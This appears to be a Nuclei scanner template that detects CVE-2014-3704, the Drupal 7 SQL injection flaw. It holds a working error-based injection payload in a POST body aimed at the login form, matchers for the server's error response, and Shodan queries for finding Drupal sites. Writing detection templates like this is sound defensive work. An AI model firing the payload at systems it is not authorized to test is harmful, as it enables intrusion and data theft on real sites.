http:
- body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0x23,concat(1,md5({{num}})),1)%23]=bob&name[0]=a
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - PDOException
    - '{{md5({{num}})}}'
  - status:
    - 500
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/?q=node&destination=node'
id: CVE-2014-3704
info:
  author: princechaddha
  classification:
    cpe: cpe:2.3:a:drupal:drupal:*:*:*:*:*:*:*:*
    cve-id: CVE-2014-3704
    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.99958
    epss-score: 0.94366
  description: The expandArguments function in the database abstraction API in Drupal
    core 7.x before 7.32 does not properly construct prepared statements, which allows
    remote attackers to conduct SQL injection attacks via an array containing specially
    crafted keys.
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access, data leakage, and potential compromise of the Drupal application and its
    underlying database.

    '
  metadata:
    max-request: 1
    product: drupal
    shodan-query:
    - http.component:"drupal"
    - cpe:"cpe:2.3:a:drupal:drupal"
    vendor: drupal
  name: Drupal SQL Injection
  reference:
  - https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql
  - https://nvd.nist.gov/vuln/detail/CVE-2014-3704
  - https://www.drupal.org/SA-CORE-2014-005
  - https://www.exploit-db.com/exploits/34984
  - https://www.exploit-db.com/exploits/34992
  - https://www.exploit-db.com/exploits/34993
  - https://www.exploit-db.com/exploits/35150
  remediation: Upgrade to Drupal core 7.32 or later.
  severity: high
  tags: cve2014,cve,edb,drupal,sqli,vkev,vuln
variables:
  num: '999999999'
